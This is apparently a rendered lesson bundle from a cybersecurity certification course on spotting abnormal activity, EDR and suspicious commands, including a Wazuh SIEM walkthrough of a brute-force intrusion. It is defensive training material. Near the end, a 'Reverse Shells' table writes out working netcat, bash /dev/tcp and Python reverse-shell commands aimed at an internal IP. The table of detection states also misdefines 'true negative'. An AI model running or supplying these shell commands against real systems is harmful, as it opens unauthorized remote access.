import{_ as o,c as s,a,b as e,d as i,o as n}from"./app-DJ4_YnJ2.js";const r="/cyber-defense-pro/images/CyberDefensePro/malicious_activity_1_8.3.7.png",l="/cyber-defense-pro/images/CyberDefensePro/malicious_activity_2_8.3.7.png",c="/cyber-defense-pro/images/CyberDefensePro/malicious_activity_3_8.3.7.png",d="/cyber-defense-pro/images/CyberDefensePro/malicious_activity_4_8.3.7.png",h="/cyber-defense-pro/images/CyberDefensePro/malicious_activity_5_8.3.7.png",p="/cyber-defense-pro/images/CyberDefensePro/malicious_activity_6_8.3.7.png",u={};function m(f,t){return n(),s("div",null,t[0]||(t[0]=[a('<h2 id="section-8-3-exploring-abnormal-activity" tabindex="-1"><a class="header-anchor" href="#section-8-3-exploring-abnormal-activity"><span>Section 8.3 Exploring Abnormal Activity</span></a></h2><p>As you study this section, answer the following questions:</p><ul><li>What are some examples of abnormal activity in a file system?</li><li>What are the components of an endpoint detection and response solution?</li><li>What are the four states of threat detection?</li></ul><p>In this section, you will learn to:</p><ul><li>Identify malicious activity through analysis</li><li>Analyze FTP credentials with Wireshark</li></ul><p>The key terms for this section include:</p><p><strong>Key Terms and Definitions</strong></p><table class="terms"><caption> Key Terms and Definitions </caption><thead><tr><th>Term</th><th>Definition</th></tr></thead><tbody><tr><td>User and entity behavior analytics (UEBA)</td><td> A solution that helps with monitoring endpoint and network devices. UEBA products scan indicators from multiple intrusion detection and log sources to identify anomalies. </td></tr><tr><td>Endpoint detection and response (EDR)</td><td> A security strategy focused on the identification, tracking, and response to threats on endpoints, such as laptops, desktops, mobile devices, and servers. </td></tr><tr><td>Known threat</td><td> A threat that has a unique known signature and can be identified by a security monitoring tool. </td></tr><tr><td>Unknown threat</td><td>A threat that has no known signatures.</td></tr><tr><td>Anomalous activity</td><td> Activity that deviates from the normal actions of a specific system. </td></tr></tbody></table><p>This section helps you prepare for the following certification exam objectives:</p><table><thead></thead><thead><tr><th>Exam</th><th>Objective</th></tr></thead><tbody><tr><td>CompTIA CySA+ CS0-003</td><td> 1.2 Given a scenario, analyze indicators of potentially malicious activity <ul><li> Network-related <ul><li>Irregular peer-to-peer communication</li><li>Activity on unexpected ports</li></ul></li><li> Application-related <ul><li>Anomalous activity</li><li>Unexpected outbound communication</li><li>Service interruption</li><li>Application logs</li></ul></li></ul><p> 1.3 Given a scenario, use appropriate tools or techniques to determine malicious activity </p><ul><li> Tools <ul><li><ul><li>Wireshark</li></ul></li><li> Log analysis/correlation <ul><li>Security information and event management (SIEM)</li></ul></li><li> Endpoint security <ul><li>Endpoint detection and response (EDR)</li></ul></li><li> Domain Name System (DNS) and Internet Protocol (IP) reputation </li></ul></li><li> Common techniques <ul><li>File analysis</li><li> User behavior analysis <ul><li>Abnormal account activity</li></ul></li></ul></li></ul></td></tr><tr><td>TestOut CyberDefense Pro</td><td> 1.1 Monitor networks <ul><li>Monitor network ports and sockets</li></ul><p>2.2 Detect threats using analytics and intelligence</p><ul><li>Use endpoint protection tools</li></ul><p>3.1 Implement security controls to mitigate risk</p><ul><li>Implement antivirus and endpoint security</li><li>Perform application and data protection tasks</li></ul><p>4.3 Analyze indicators of compromise</p><ul><li>Examine applications for any signs of compromise</li></ul></td></tr></tbody></table><h3 id="_8-3-1-abnormal-activity" tabindex="-1"><a class="header-anchor" href="#_8-3-1-abnormal-activity"><span>8.3.1 Abnormal Activity</span></a></h3><p>Click one of the buttons to take you to that part of the video.</p><p>Abnormal Activity 00:00-00:27 Constant monitoring and vigilance are required to keep networks safe from attackers. When abnormal activity is detected, it should be investigated immediately. Some areas that should be monitored include the file system, user accounts, and the network itself. In this lesson, we&#39;ll take a look at some signs of abnormal activity in each of these areas, and we&#39;ll also look at how analytics can be used to help in monitoring our systems for abnormal activity.</p><p>File System Abnormal Activity 00:27-01:26 Abnormal activity in the file system of a host machine can point to a potential security breach. Some things to look for include unknown files, altered file attributes, and altered files. Also, check for new files or folders that appear without explanation or have no purpose. These new files and folders can point to a rootkit or other attack occurring on the system.</p><p>One common trick attackers often use is to change or add a file extension. For example, an attacker might name a file notanattack.txt.exe and then change the file icon to conceal the purpose better. Since most users have file extensions hidden, the user only sees notanattack.txt and doesn&#39;t think anything&#39;s different or wrong.</p><p>Other things to look for include modifications to system software and configuration files, decreases in system performance, and unexplained system reboots or crashes. Gaps in system log files are often a sign of intrusion, as attackers often delete these files to hide their activities.</p><p>User Account Abnormal Activity 01:26-02:14 Abnormal user account activity can point to a potential security incident. Unauthorized activity, such as a user account being added to a new security group or even new accounts being created, are signs of a potential attack or malware infection.</p><p>Abnormal user activity should be monitored as well. For example, if a user is scheduled only to work from 9 am to 5 pm but starts showing activity at 10:00 in the evening, this should be investigated immediately.</p><p>With the increase in remote work, impossible travel is another abnormal activity that should be investigated. Impossible travel is when a user logs in with an IP address based in one location, say Utah. Then 30 minutes later, they log in again from an IP address based somewhere else that would be impossible to travel to in a short time, like London. Keep in mind that impossible travel can be legitimate with a VPN, but it should be investigated.</p><p>Network Abnormal Activity 02:14-03:06 Network devices such as routers, switches, firewalls, proxy servers, and all other security devices that protect the network should be closely monitored. These will often be the first devices the attacker runs into when attempting to gain unauthorized network access.</p><p>One of the first signs of network intrusion is increased and unexplained use of the network bandwidth. For example, if the attacker has infected multiple systems with malware, those systems will now start communicating with the C&amp;C server, which will result in an increase in network bandwidth.</p><p>Having a proper list of what traffic should be allowed on the network can help quickly identify possible intrusions. Any unauthorized traffic, such as connection attempts to closed ports, repeated login attempts from remote hosts using unusual or unknown IP addresses, and probes for services or systems running on the network, should all be immediately investigated.</p><p>User and Entity Behavior Analytics (UEBA) 03:06-03:54 As you can see, there&#39;s a lot to monitor on a network, and handling this manually would be virtually impossible in a larger network. To help make this simpler, many of our monitoring systems can make use of User and Entity Behavior Analytics, or UEBA.</p><p>UEBA is implemented in many different SIEM systems and monitoring solutions, such as Microsoft&#39;s Sentinel for Azure. These systems utilize AI and machine learning to establish a baseline of different network and system activities. UEBA then monitors user and entity activities, and anything outside of the baseline generates an alert which can then be investigated. Entities include workstations, virtualized servers, IoT devices, and other network devices. Implementing a solution with UEBA makes monitoring and detecting potential threats much more accurate.</p><p>Summary 03:54-04:37 That&#39;ll wrap up this lesson on abnormal activity. In this lesson, we went over some types of abnormal activity to look for. Abnormal activity in the file system can include new or modified files, software, decreased performance, or gaps in system logs. User accounts should be monitored for improper group assignments and abnormal activity, such as impossible travel. Abnormal network traffic, such as increased bandwidth, traffic on unusual ports and protocols, and unknown IP addresses being used, are all signs of a possible network threat. We also went over how monitoring systems, like a SIEM system, can integrate AI and machine learning to identify abnormal user and entity behavior to catch potential threats quickly.</p><h3 id="_8-3-2-abnormal-activity-facts" tabindex="-1"><a class="header-anchor" href="#_8-3-2-abnormal-activity-facts"><span>8.3.2 Abnormal Activity Facts</span></a></h3><p>Any abnormal activity on the network should be immediately investigated, as it could mean an attack has occurred or there is a problem with the network systems. Constant monitoring of the network systems is required to protect the network and keep it in proper working order.</p><p>This lesson covers the following topics:</p><ul><li>File system abnormal activity</li><li>User account abnormal activity</li><li>Network abnormal activity</li><li>User and entity behavior analytics (UEBA)</li></ul><h4 id="file-system-abnormal-activity" tabindex="-1"><a class="header-anchor" href="#file-system-abnormal-activity"><span>File System Abnormal Activity</span></a></h4><p>Abnormal activity in the file system of a host machine can be an indicator of compromise and should be immediately investigated.</p><p>The following are all examples of file system abnormal activity:</p><ul><li>Unknown files inserted into the system</li><li>Altered file attributes</li><li>Unrecognized file extensions such as .ODIN, .OZD, and .BUK in a Windows-based system</li><li>Rogue suid or sgid files a Linux system</li><li>Changes to the file or folder metadata</li><li>Changes to the hidden status of files</li><li>New files that do not match the existing naming scheme</li><li>Modifications to system software and configuration files</li><li>Unfamiliar processes</li><li>Decrease in system performance</li><li>System reboots or crashes</li><li>Noticeable changes to log files</li><li>Discrepancies in system audit files or corrupt files</li><li>Double file extensions</li></ul><h4 id="user-account-abnormal-activity" tabindex="-1"><a class="header-anchor" href="#user-account-abnormal-activity"><span>User Account Abnormal Activity</span></a></h4><p>Monitoring the use of user accounts is an effective way to identify suspicious activity.</p><p>The following are examples of user account abnormal activity:</p><ul><li>Incorrect permissions or ownership</li><li>Anonymous logins</li><li>Unusual account names</li><li>Changes to group membership</li><li>New unknown accounts or suspicious local accounts</li><li>Activity or logins during non-standard hours</li><li>Nonadministrative account logged into a server</li></ul><p>An indicator that has become more frequent with the adoption of remote work and cloud computing is impossible travel. Information such as GPS address, IP address, or user&#39;s device to pinpoint a user&#39;s location are tracked to determine whether a behavior was physically possible.</p><p>An example of this would be a user account logging in from an IP address in New York and logging in again 15 minutes later from Brussels. This is suspicious because it is physically impossible to travel that distance in 15 minutes. Sometimes this type of event is normal, for example, if a user utilizes a VPN with overseas service locations.</p><h4 id="network-abnormal-activity" tabindex="-1"><a class="header-anchor" href="#network-abnormal-activity"><span>Network Abnormal Activity</span></a></h4><p>Network intrusion signs are more focused on the network devices. These devices are routers, switches, firewalls, and proxy servers. The security software and security devices that protect the network are also included.</p><p>Some network intrusion signs include the following:</p><ul><li>Substantially increased network bandwidth. Use typical hours of peak activity to perform tests that will increase network bandwidth.</li><li>New/unusual ports being used or open.</li><li>New/unusual protocols and services being used.</li><li>Connection attempts to closed ports or repeated login attempts from remote hosts.</li><li>Unusual or unknown IP addresses or IPs outside the local network being used.</li><li>Evidence of communication with known malicious IP addresses or domain names.</li><li>Probes for services or systems running on the network by a remote device.</li><li>Unknown or unexplained messages and warnings in log files.</li><li>Evidence of traffic on ports associated with C&amp;C traffic using encoded communications and commands.</li><li>Evidence that a user received an email with a suspicious link, visited the site, launched an executable, and established a connection to a system on the internet.</li><li>Abnormal communication patterns, such as encrypted communication between a device and a remote host every two minutes.</li><li>Abnormal protocol activity, such as gigabytes of DNS traffic or ping requests that do not receive responses or have unusual packet sizes.</li></ul><h4 id="user-and-entity-behavior-ueba" tabindex="-1"><a class="header-anchor" href="#user-and-entity-behavior-ueba"><span>User and Entity Behavior (UEBA)</span></a></h4><p>User and entity behavior analytics (UEBA) products scan indicators from multiple intrusion detection and log sources to identify anomalies. They are often integrated with security information and event management (SIEM) platforms.</p><p>A UEBA solution supports the identification of malicious behaviors from comparison to a baseline. As the name suggests, the analytics software tracks user account behavior across different devices and cloud services. Entity refers to machine accounts, such as client workstations or virtualized server instances, and embedded hardware, such as Internet of Things (IoT) devices. The complexity of determining baselines and reducing false positives means that UEBA solutions are often heavily dependent on AI and machine learning.</p><p>Examples include Microsoft&#39;s Advanced Threat Analytics ( <a href="http://docs.microsoft.com/en-us/advanced-threat-analytics/what-is-ata" target="_blank" rel="noopener noreferrer">docs.microsoft.com/en-us/advanced-threat-analytics/what-is-ata</a> ) and Splunk UEBA ( splunk.com/en_us/software/user-behavior-analytics.html ).</p><h3 id="_8-3-3-endpoint-detection-and-response" tabindex="-1"><a class="header-anchor" href="#_8-3-3-endpoint-detection-and-response"><span>8.3.3 Endpoint Detection and Response</span></a></h3><p>Click one of the buttons to take you to that part of the video.</p><p>Endpoint Detection and Response 00:00-00:19 Keeping endpoint devices secure is vital to the security of our networks. To help with this, endpoint detection and response, also referred to as endpoint detection and threat response, systems can be implemented. In this lesson, we&#39;ll look at EDR systems and how they work. We&#39;ll also take a look at how to classify potential threats discovered by the EDR.</p><p>EDR Systems 00:19-02:19 Any physical device that connects to our networks is considered an endpoint device. This can include workstations, mobile devices, laptops, and servers. To help keep these devices secure, we can implement an EDR system. EDR systems combine traditional security tools along with advanced analytics to provide a proactive security solution.</p><p>EDR systems monitor endpoint and network events and store all the information in a central database for analysis. Analysis software combs through the database to find and investigate any abnormal activity. These systems can prevent advanced attacks before they happen by seeing early warning signs or, at the very least, mitigating an attack&#39;s effects.</p><p>An EDR system consists of three main components. First is the centralized security monitoring platform where all collected data is stored. We then have the endpoint acquisition points, which are the endpoints themselves. Lastly, the data analysis engine is where the data is analyzed so proper security decisions can be made.</p><p>In the event of a security breach, the EDR system can help improve the incident response time by automating specific actions when a security breach is detected. The EDR system is also beneficial in the follow-up of a security incident. The activity and logs that the EDR collects can help quickly identify how and why the incident occurred.</p><p>Aside from monitoring and threat detection, EDR systems can provide other capabilities which can be used to protect our network endpoints. This can include setting up a honeypot to distract potential threats and catching them before they can attack the network, malware detection, and URL filtering to block malicious URLs and prevent phishing attacks.</p><p>Newer EDR systems integrate artificial intelligence and machine learning to perform advanced analytics such as user and entity behavior analysis. This allows the EDR system to proactively detect threats and take necessary actions to mitigate any threats. The capabilities provided by an EDR system align with the NIST Cybersecurity Framework Core Capabilities of identify, protect, detect, respond, and recover.</p><p>Threat Classification 02:19-03:53 Once a potential threat is discovered, you need to know how to classify the threat. Classifying potential threats is important because it helps us figure out where the higher risks are. First, we need to identify whether the threat is a known or unknown threat.</p><p>Known threats can be identified by traditional monitoring tools, like an IDS or antivirus program. These threats are usually identified by their signature. Signatures are like unique fingerprints that monitoring tools can use for identification.</p><p>A known unknown, or simply an unknown, threat has an identifiable pattern, but there&#39;s no signature in a database for it yet. An unknown unknown threat means the threat is completely new and unidentified. An example of an unknown unknown threat is a zero-day threat. This is any threat that&#39;s unknown and has no fix yet. Despite its name, a zero-day threat can exist for quite a while before a viable solution for it is created.</p><p>When a potential threat is identified by the EDR, it will fall into one of four categories or states. A true positive means that the system accurately identified a threat.</p><p>A true negative means that legitimate traffic was properly identified and not flagged as a threat. These categories demonstrate that the monitoring system is working properly. A false positive occurs when there&#39;s an alert but no actual threat or vulnerability. These false alarms are extremely time-consuming, as each one must be validated. The final category is false negative. A false negative occurs when malicious traffic is identified as acceptable. These are especially dangerous and usually occur because of improper configuration settings in the scanner.</p><p>Summary 03:53-04:18 That&#39;ll wrap up our lesson on EDR systems. In this lesson, we went over the components of an EDR system and the benefits they provide, such as proactive threat detection and improved incident response. We then looked at how we can classify potential threats discovered by the EDR systems. Today&#39;s networks can be quite complicated, and implementing advanced monitoring systems like an EDR are needed to protect endpoints and the network.</p><h3 id="_8-3-4-endpoint-detection-and-response-facts" tabindex="-1"><a class="header-anchor" href="#_8-3-4-endpoint-detection-and-response-facts"><span>8.3.4 Endpoint Detection and Response Facts</span></a></h3><p>Endpoint detection and response (EDR) is an important security solution designed to provide proactive capabilities by combining traditional endpoint security with advanced analytics to detect and respond to suspicious activity. EDR solutions provide real-time and historical visibility into a breach, contain malware within a single host, and help facilitate remediation of the host to its original state. In a nutshell, EDR helps give an answer to the question, &quot;What happened?&quot;</p><p>This lesson covers the following topics:</p><ul><li>Endpoint detection and response (EDR)</li><li>Threat classification</li><li>Improving security</li></ul><h4 id="endpoint-detection-and-response-edr" tabindex="-1"><a class="header-anchor" href="#endpoint-detection-and-response-edr"><span>Endpoint Detection and Response (EDR)</span></a></h4><p>An EDR strategy focuses on the identification, tracking, and response to threats on endpoints (such as laptops, desktops, mobile devices, and servers). This differs from typical antivirus solutions focused solely on identifying and quarantining malware. EDR provides a timeline or report of events that typically extends beyond the initial infection or intrusion.</p><p>EDR systems monitor endpoint and network events and stores all information in a central database for analysis. Analysis software then combs through the database to find and investigate any abnormal activity. These systems can prevent attacks before they happen by seeing early warning signs or, at very least, mitigating an attack&#39;s effects.</p><p>An EDR solution typically consists of the following components:</p><table><thead><tr><th>EDR Component</th><th>Description</th></tr></thead><tbody><tr><td>Centralized security monitoring platform</td><td> Where data collected by the security solution is stored and analyzed. </td></tr><tr><td>Endpoint acquisition points</td><td> The endpoints that the platform acquires data from, such as desktop computers or laptops. </td></tr><tr><td>Data analysis engine</td><td> Where the data is analyzed and contextualized for real-time or historical decision-making. </td></tr></tbody></table><p>The following table describes some of the advantages offered by EDR systems:</p><table><thead><tr><th>EDR Advantage</th><th>Description</th></tr></thead><tbody><tr><td>Malicious activity detection</td><td> A key component of EDR is the advanced capability to detect and analyze malicious activity on endpoints, such as laptops, desktops, and mobile devices. </td></tr><tr><td>Improved incident response</td><td> Security teams can develop proactive measures by leveraging real-time incident response capabilities offered by the EDR solution. </td></tr><tr><td>Proactive prevention</td><td> EDR can help look for patterns and behaviors indicative of an imminent threat. </td></tr><tr><td>Risk assessment</td><td> Real-time risk assessment capabilities help security teams identify and analyze risk levels associated with various incidents to craft appropriate responses better. </td></tr><tr><td>Incident investigation</td><td> The incident investigation function of EDR allows security analysts to investigate incidents and accurately determine their root causes. </td></tr></tbody></table><p>EDR platform capabilities include:</p><table><thead><tr><th>EDR Capabilities</th><th>Description</th></tr></thead><tbody><tr><td>Malware detection</td><td> A malware detection tool will look for specific malicious behavior, such as running a specific file or DLL. </td></tr><tr><td>URL filtering</td><td> URL filtering is used to block access to malicious URLs often associated with phishing attacks. </td></tr><tr><td>Honeypots</td><td> Honeypots allow security teams to create fake malicious activity and block it before it causes any damage. </td></tr><tr><td>Monitoring</td><td> Monitoring tools allow an organization to track the activity of endpoints, such as system activity, application use, network activity, and firewall rules. </td></tr><tr><td>Orchestration</td><td> EDR tools can orchestrate the activities of other security tools in response to suspicious activity or specific event triggers. </td></tr><tr><td>Detect emerging threats</td><td> EDR tools can help organizations detect new types of attacks, such as zero-day vulnerabilities, by looking for new attack patterns on the network. </td></tr></tbody></table><p>Where earlier endpoint protection suites report to an on-premises management server, next-generation endpoint agents, such as EDR solutions, are more likely to be managed from a cloud portal and use artificial intelligence (AI) and machine learning to perform user and entity behavior analysis. These capabilities are part of the security service provider&#39;s offering and provide capabilities that directly align to the NIST Cybersecurity Framework Core Capabilities of identify, protect, detect, respond, and recover. Endpoint detection and response tools are designed to track and observe all endpoints in context to more accurately identify malicious activity in real time and automate the response.</p><h4 id="threat-classification" tabindex="-1"><a class="header-anchor" href="#threat-classification"><span>Threat Classification</span></a></h4><p>Once a threat has been discovered, it should be classified. The following table describes the different classifications:</p><table><thead><tr><th>Threat Classification</th><th>Description</th></tr></thead><tbody><tr><td>Known threat</td><td> A known threat: <ul><li> Can be identified by security monitoring tools such as an antivirus program or IDS. </li><li>Typically has a unique signature.</li><li> Generates an alert when the security monitoring device comes across a matching signature. </li></ul></td></tr><tr><td>Unknown threat</td><td> Unknown threats have no defined signatures. An unknown threat can be classified as either a: <ul><li> Known Unknown: These have an identifiable pattern but no signature in the database. </li><li> Unknown Unknown: These have no identifiable pattern or signature. They are completely new and unidentified threats. <ul><li> Zero-day threats are examples of an unknown unknown threat. </li><li>A zero-day threat is unknown and has no fix yet.</li><li> These threats can exist for quite a while until they are discovered and a fix is found. </li></ul></li></ul></td></tr></tbody></table><p>Any detection of a possible threat can fall into one of four states:</p><table><thead><tr><th>State</th><th>Description</th></tr></thead><tbody><tr><td>True positive</td><td>The system detected a threat.</td></tr><tr><td>True negative</td><td> The system detected a threat and did not flag it as legitimate traffic. </td></tr><tr><td>False positive</td><td> The system flagged harmless traffic as a potential threat. False positives are time-consuming because they must be researched. </td></tr><tr><td>False negative</td><td> Malicious traffic is flagged as harmless. These are the most dangerous because it means a threat has been missed. </td></tr></tbody></table><h4 id="improving-security" tabindex="-1"><a class="header-anchor" href="#improving-security"><span>Improving Security</span></a></h4><p>New threats are constantly being discovered. A security analyst must keep current with the latest threats and know how to properly secure the network against them. The following table describes some steps that can be taken to improve security in addition to EDR solutions.</p><table><thead><tr><th>Security</th><th>Description</th></tr></thead><tbody><tr><td>Block list</td><td> A block list (also known as a deny list) is the process of defining specific programs, ports, IP addresses, services, or other types of traffic that will be blocked from the network or systems. </td></tr><tr><td>Allow list</td><td> An allow list (also known as a approved list) is the process of defining specific programs, ports, IP addresses, services, or other types of traffic that are allowed on the network or systems. Only the specified traffic will be allowed. </td></tr><tr><td>Rules</td><td> Security devices use rules to determine the traffic to allow or block. The security analyst should review these rules on a regular basis to ensure they are updated and applicable to the network systems. </td></tr></tbody></table><h3 id="_8-3-7-identifying-malicious-activity" tabindex="-1"><a class="header-anchor" href="#_8-3-7-identifying-malicious-activity"><span>8.3.7 Identifying Malicious Activity</span></a></h3><p>This lesson provides a practical example of identifying suspicious activity through analysis. In this example, we will cover the following steps:</p><ul><li>Analyzing suspicious activity</li><li>Drilling deeper into the event</li><li>Observing a backdoor</li><li>Summary of the Event</li></ul><h4 id="analyzing-suspicious-activity" tabindex="-1"><a class="header-anchor" href="#analyzing-suspicious-activity"><span>Analyzing Suspicious Activity</span></a></h4><p>Observing the security information and event management (SIEM) dashboard (Wazuh in this example), we see signs of serious trouble. Review the dashboard and observe the number of authentication failures, the spike in the trend graphs, and the indication of two level 12 or higher alerts.</p><p><img src="'+r+'" alt="A Wazuh dashboard lists the total authentication, level 12 or above alerts, number of authentication failure and number of authentication success."></p><blockquote><p>details</p><p>Two area graphs are titled alert group evolution and alerts. Three ring graphs lists the top 5 alerts, top 5 rule groups, and top 5 P C I D S S requirements.</p><p>Using the Wazuh Dashboard to view alert trends. (Screenshot courtesy of Wazuh Inc.)</p></blockquote><h3 id="confirming-the-findings" tabindex="-1"><a class="header-anchor" href="#confirming-the-findings"><span>Confirming the Findings</span></a></h3><p>The system indicating the failed logon attempts is a Ubuntu Linux server. Using the command line, the failure events can be confirmed. We will use the <strong>cat</strong> command to display the content of the /var/log/auth.log file and filter the output to display only lines containing the words (case insensitive) &quot;failed password.&quot; The results indicate that the user tux has experienced a password attack.</p><p><img src="'+l+'" alt="The command cat used to display the content of a file and filters the output to display the lines with words &#39;Failed password&#39;."></p><p>Validating alerts by inspecting the auth.log and searching for &quot;failed password&quot; log entries.</p><h4 id="drilling-deeper-into-the-event" tabindex="-1"><a class="header-anchor" href="#drilling-deeper-into-the-event"><span>Drilling Deeper Into the Event</span></a></h4><p>Return to the SIEM dashboard and click on the authentication failure number to filter the view to the matching events. This new view highlights one of the many benefits of using a SIEM. Manually reviewing the host&#39;s log file confirmed the events, but obtaining a clear view of the sequence of events is difficult to accomplish quickly. The new view of the authentication failure events indicates several other problems. This new view indicates that the password attack was successful and that the attacker performed several other tasks after obtaining access. Additionally, observe that the attacker&#39;s actions are correlated to known tactics, techniques, and procedures (TTPs) documented in the MITRE ATT&amp;CK Framework.</p><p><img src="'+c+'" alt="A Wazuh security events page."></p><p>Using Wazuh to review individual security events and associated MITRE ATT&amp;CK Technique associations. (Screenshot courtesy of Wazuh Inc.)</p><p>In addition to determining the attack was successful, the SIEM determined that the attacker gained access to the server and created a new user.</p><p><img src="https://cdn.testout.com/cyberdefensepro2023v2-en-us/en-us/resources/text/t_malicious_activity_cdp2/5052-1680712144346.png" alt="Wazuh displaying password attack was successful."></p><p>Using Wazuh to determine if a password attack was successful. (Screenshot courtesy of Wazuh Inc.)</p><h5 id="confirming-the-findings-1" tabindex="-1"><a class="header-anchor" href="#confirming-the-findings-1"><span>Confirming the Findings</span></a></h5><p>Connecting to the server, we can filter /var/log/auth.log to show only the lines containing the words &quot;new user,&quot; and we see a new user named hax0r has been created.</p><p><img src="'+d+'" alt="Validating alerts by inspecting the auth.log and searching for new user entries."></p><p>Validating alerts by inspecting the auth.log and searching for entries containing &quot;new user.&quot;</p><h4 id="observing-a-backdoor" tabindex="-1"><a class="header-anchor" href="#observing-a-backdoor"><span>Observing a Backdoor</span></a></h4><p>Additionally, by reviewing the server&#39;s network activity tab, we can observe that a suspicious port is in use, namely port 4444, associated with the Metasploit Framework.</p><p><img src="'+h+'" alt="A Wazuh inventory data page has 3 tables."></p><blockquote><p>Details</p><p>The first lists the name, M A C, state, M T U, and Type. The second lists the local I P, local port, state, and protocol. The third titled network settings lists the interface, address, netmask, protocol, and broadcast.</p><p>Using Wazuh to view live network connection information on an individual host. (Screenshot courtesy of Wazuh Inc.)</p></blockquote><h5 id="confirming-the-findings-2" tabindex="-1"><a class="header-anchor" href="#confirming-the-findings-2"><span>Confirming the Findings</span></a></h5><p>The suspicious port shown by the SIEM can be confirmed using the <strong>netstat</strong> (or ss) command on the server, as seen below. Notice the application associated with port 4444 (it is netcat).</p><p><img src="'+p+'" alt="The use of netstat command. A table lists the proto, Recv-Q, Send-Q, local address, foreign address, state, and P I D slash program name."></p><p>Using netstat to validate active network connections reported by the SIEM.</p><h4 id="summary-of-the-event" tabindex="-1"><a class="header-anchor" href="#summary-of-the-event"><span>Summary of the Event</span></a></h4><p>In this example, we see a common pattern of events that occur based on a clear indicator of compromise (IoC) found in a SIEM. A password attack was launched against a server and was successful. The attacker used the account to gain access to the server and, because the account had privileged access, could quickly create a new account. As an added measure, the attacker created a backdoor using netcat to provide access in case the breach account password was reset, and the new account was removed.</p><h3 id="_8-3-8-interpreting-suspicious-commands-facts" tabindex="-1"><a class="header-anchor" href="#_8-3-8-interpreting-suspicious-commands-facts"><span>8.3.8 Interpreting Suspicious Commands Facts</span></a></h3><p>This lesson covers the following topics:</p><ul><li>Interpreting suspicious commands</li><li>Important Linux commands</li><li>Important Windows commands</li><li>Important PowerShell commands</li><li>Reverse shells</li></ul><h4 id="interpreting-suspicious-commands" tabindex="-1"><a class="header-anchor" href="#interpreting-suspicious-commands"><span>Interpreting Suspicious Commands</span></a></h4><p>Discerning normal activity from suspicious activity is the challenge of working as a security analyst. Locating suspicious activity on a single system can be challenging, so when considering the sheer number of workstations, mobile devices, and servers used by most organizations, it becomes clear how difficult the job can be.</p><p>Several well-known specialty commands on Windows and Linux systems are used for administrative and troubleshooting purposes. Attackers also frequently use these commands as part of an attack. The following lists some common commands that warrant further investigation. Signs of use do not guarantee malicious activity, but analysis must determine why they were used.</p><p>SIEM plays a critical role in helping determine when these commands were used on any system in your environment. Administrators or security analysts must change system configurations to log command activity, which is not typically the default. Then the SIEM must collect this log and event data for analysis and identification.</p><h4 id="important-linux-commands" tabindex="-1"><a class="header-anchor" href="#important-linux-commands"><span>Important Linux Commands</span></a></h4><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><b>ssh</b></td><td> Used to remotely access a server and obtain shell access for administrative purposes. </td></tr><tr><td><b>wget</b></td><td> Used to interact with a web server using a command line interface. </td></tr><tr><td><b>curl</b></td><td>Similar to <b>wget</b> but includes more functionality.</td></tr><tr><td><b>telnet</b></td><td> A cleartext protocol used to remotely access a server. Telnet has some well-known exploitable vulnerabilities. </td></tr><tr><td><b>ftp</b></td><td> A cleartext protocol used to perform file transfer. FTP has some well-known exploitable vulnerabilities. </td></tr><tr><td><b>arp</b> or <b>ss</b></td><td>Used to identify physical addresses of hosts.</td></tr><tr><td><b>ip</b> or <b>ifconfig</b></td><td> Used to identify and change network configuration information. </td></tr><tr><td><b>whoami</b></td><td> Used to identify the current session user. Often used after obtaining shell access to determine privilege levels. </td></tr><tr><td><b>netstat</b></td><td> Used to display network activity, in particular active IP addresses and ports. </td></tr></tbody></table><h4 id="important-windows-commands" tabindex="-1"><a class="header-anchor" href="#important-windows-commands"><span>Important Windows Commands</span></a></h4><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><b class="fw-bold">netstat</b></td><td> Used to display network activity, in particular active IP addresses and ports. </td></tr><tr><td><b class="fw-bold">ping</b></td><td> Used to test connectivity among network devices (can also be abused to carry data). </td></tr><tr><td><b class="fw-bold">ipconfig</b></td><td>Used to display IP address configuration information.</td></tr><tr><td><b class="fw-bold">nslookup</b></td><td>Used to interact with DNS using the command line.</td></tr><tr><td><b class="fw-bold">tasklist</b></td><td>Used to display the processes running on a system.</td></tr><tr><td><b class="fw-bold">net</b></td><td>The net command is used to perform many administrative tasks.</td></tr><tr><td><b class="fw-bold">netsh</b></td><td> Allows local and remote configuration of network-related services. </td></tr><tr><td><b class="fw-bold">wmic</b></td><td> A command line interface for Windows Management Instrumentation (WMI). </td></tr></tbody></table><h4 id="important-powershell-commands" tabindex="-1"><a class="header-anchor" href="#important-powershell-commands"><span>Important PowerShell Commands</span></a></h4><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><b class="fw-bold">Invoke-Request</b></td><td>Used to remotely issue commands to a Windows system.</td></tr><tr><td><b class="fw-bold">Invoke-WebRequest</b></td><td>Used to interact with a system using HTTP or HTTPS.</td></tr><tr><td><b class="fw-bold">DownloadString</b></td><td> Used to download information from a web server, such as a malicious script or payload. </td></tr><tr><td><b class="fw-bold">Start-Process</b></td><td> Starts a new process (often to load malware or a rogue process). </td></tr><tr><td><b class="fw-bold">Get-WMIObject</b></td><td> Used to collect information from a host using Windows Management Instrumentation (WMI). </td></tr><tr><td><b class="fw-bold">Get-Process</b></td><td>Used to display processes configured on a system.</td></tr></tbody></table><h4 id="reverse-shells" tabindex="-1"><a class="header-anchor" href="#reverse-shells"><span>Reverse Shells</span></a></h4><p>Reverse shells are very popular, as they consistently work even if a firewall is present. A reverse shell describes making a victim system connect back to the attacker&#39;s machine to establish shell access. The chart below lists specific examples of commands used when creating a reverse shell.</p>',131),e("table",null,[e("thead",null,[e("tr",null,[e("th",{class_:"firstTableHeader"},"Utility or Language"),e("th",null,"Command Syntax Examples")])]),e("tbody",null,[e("tr",null,[e("td",null,"netcat listener"),e("td",null,[e("b",{class:"fw-bold"},"nc -lvnp 8181")])]),e("tr",null,[e("td",null,"bash shells"),e("td",null,[e("h4",{class:"fw-bold"}," bash -i >& /dev/tcp/10.20.100.1/8181 0>&1 "),e("h4",{class:"fw-bold"}," /bin/bash -l > /dev/tcp/10.20.100.1/8181 0<&1 2>&1 ")])]),e("tr",null,[e("td",null,"Python"),e("td",null,[e("b",{class:"fw-bold"},`export RHOST="10.20.100.1";export RPORT=8181;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'`)])]),e("tr",null,[e("td",null,"PowerShell reverse shell one-liner"),e("td",null,[e("p",null,[i(" See "),e("a",{href:"https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3",target:"_blank"}," 